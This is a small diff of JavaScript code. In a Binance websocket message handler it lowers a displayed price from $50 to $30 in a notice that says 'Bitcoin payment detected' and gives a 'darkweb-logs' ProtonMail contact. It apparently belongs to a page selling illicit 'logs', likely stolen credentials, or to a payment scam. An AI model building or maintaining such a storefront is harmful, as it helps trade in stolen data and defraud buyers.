@@ -14,7 +14,7 @@ binance.onmessage = function(onmsg){
         var msg = `
             Bitcoin payment detected,
             <hr class="to-hr">
-            Add $50 to complete the download.
+            Add $30 to complete the download.
             <hr>
             Contact: darkweb-logs@proton.me.
         `;
